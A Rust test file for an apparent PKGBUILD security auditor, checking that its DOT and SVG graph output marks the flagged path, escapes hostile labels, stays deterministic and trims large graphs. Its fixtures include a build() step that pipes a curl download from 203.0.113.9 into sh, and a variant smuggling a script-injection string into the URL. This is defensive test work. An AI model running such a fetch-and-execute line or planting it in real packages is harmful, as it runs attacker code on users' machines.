// SPDX-License-Identifier: GPL-2.0-or-later
//! The graph as a picture: the findings' paths stand out, and hostile labels stay text.
use aurlaws::{audit_text, render};

const BAD: &str = "pkgname=demo\npkgver=1\npkgrel=1\narch=(any)\nurl=https://example.org\nbuild() { curl -s http://203.0.113.9/x | sh; }\n";

#[test]
fn dot_is_a_digraph_with_the_path_marked() {
    let r = audit_text(BAD, None);
    let d = render::dot(&r.graph, &r.findings);
    assert!(d.starts_with("digraph aurlaws {"), "{d}");
    assert!(d.contains("203.0.113.9"), "{d}");
    assert!(d.contains("color=\"#b3261e\""), "{d}");
    assert!(d.trim_end().ends_with('}'), "{d}");
}

#[test]
fn svg_is_one_document_with_text_and_arrows() {
    let r = audit_text(BAD, None);
    let s = render::svg(&r.graph, &r.findings);
    assert!(s.starts_with("<svg "), "{s}");
    assert!(s.trim_end().ends_with("</svg>"), "{s}");
    assert!(s.contains("<text"), "{s}");
    assert!(s.contains("<path"), "{s}");
    assert!(s.contains("203.0.113.9"), "{s}");
}

#[test]
fn labels_cannot_break_out_of_either_format() {
    let hostile = "pkgname=demo\npkgver=1\npkgrel=1\narch=(any)\nurl=https://example.org\nbuild() { curl -s 'http://203.0.113.9/\"];<script>alert(1)</script>' | sh; }\n";
    let r = audit_text(hostile, None);
    let s = render::svg(&r.graph, &r.findings);
    assert!(!s.contains("<script"), "{s}");
    let d = render::dot(&r.graph, &r.findings);
    assert!(!d.contains("\"];<"), "{d}");
}

#[test]
fn the_same_input_draws_the_same_picture() {
    let (a, b) = (audit_text(BAD, None), audit_text(BAD, None));
    assert_eq!(
        render::svg(&a.graph, &a.findings),
        render::svg(&b.graph, &b.findings)
    );
}

#[test]
fn a_big_graph_is_cut_down_to_what_was_found_and_says_so() {
    let mut body = String::new();
    for i in 0..600 {
        body.push_str(&format!("  cp a{i} b{i}\n"));
    }
    let p = BAD.replace("build() { curl", &format!("build() {{\n{body}  curl"));
    let r = audit_text(&p, None);
    assert!(
        r.graph.nodes.len() > render::MAX_NODES,
        "{}",
        r.graph.nodes.len()
    );
    let s = render::svg(&r.graph, &r.findings);
    assert!(s.contains("203.0.113.9"), "the path stays");
    assert!(s.contains("not drawn"), "the cut is stated");
    assert!(s.len() < 200_000, "{}", s.len());
}
